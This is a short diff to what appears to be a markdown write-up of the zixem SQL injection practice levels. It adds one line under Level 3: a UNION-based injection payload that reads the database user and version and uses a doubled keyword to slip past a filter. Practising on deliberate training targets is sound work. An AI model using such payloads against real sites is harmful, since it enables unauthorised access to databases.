@@ -25,6 +25,8 @@
 | [Level 3](http://www.zixem.altervista.org/SQLi/level3.php?item=3) | Medium |
 | ------- | ---------- |
 
+ `?item=-9999' unionon select user(),version(),3,4; -- -`
+
 | [Level 4](http://www.zixem.altervista.org/SQLi/level4.php?ebookid=7) | Normal |
 | ------- | ---------- |
 
